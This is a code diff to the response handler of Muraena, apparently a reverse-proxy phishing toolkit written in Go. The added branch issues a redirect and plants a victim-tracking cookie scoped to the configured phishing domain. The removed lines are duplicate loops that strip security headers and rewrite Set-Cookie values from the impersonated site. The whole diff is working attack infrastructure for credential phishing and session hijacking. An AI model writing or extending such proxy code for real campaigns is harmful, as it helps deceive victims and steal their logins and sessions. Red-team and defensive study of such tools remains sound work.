@@ -194,6 +194,18 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 		sess.Config.Proxy.Transform.Base64.Padding,
 	}
 
+	if response.Request.Header.Get("If-Landing-Redirect") != "" {
+		response.StatusCode = 302
+		response.Header.Add("X-If-Range", response.Request.Header.Get("X-If-Range"))
+		response.Header.Add("Set-Cookie",
+			fmt.Sprintf("%s=%s; Domain=%s; Path=/; Expires=Wed, 30 Aug 2029 00:00:00 GMT",
+				muraena.Session.Config.Tracking.Identifier, response.Request.Header.Get("X-If-Range"),
+				muraena.Session.Config.Proxy.Phishing))
+		response.Header.Set("Location", response.Request.Header.Get("If-Landing-Redirect"))
+
+		return
+	}
+
 	// Replacer object
 	replacer := muraena.Replacer
 
@@ -272,12 +284,6 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 	for _, header := range sess.Config.Proxy.Remove.Response.Header {
 		response.Header.Del(header)
 	}
-	//
-	// HEADERS
-	//
-	for _, header := range sess.Config.Proxy.Remove.Response.Header { // delete security headers
-		response.Header.Del(header)
-	}
 
 	// transform headers of interest
 	for _, header := range sess.Config.Proxy.Transform.Response.Header {
@@ -291,17 +297,7 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 			}
 		}
 	}
-	for _, header := range sess.Config.Proxy.Transform.Response.Header { // transform headers of interest
-		if response.Header.Get(header) != "" {
-			if header == "Set-Cookie" {
-				for k, value := range response.Header["Set-Cookie"] {
-					response.Header["Set-Cookie"][k] = replacer.Transform(value, false, base64)
-				}
-			} else {
-				response.Header.Set(header, replacer.Transform(response.Header.Get(header), false, base64))
-			}
-		}
-	}
+
 
 	//
 	// BODY
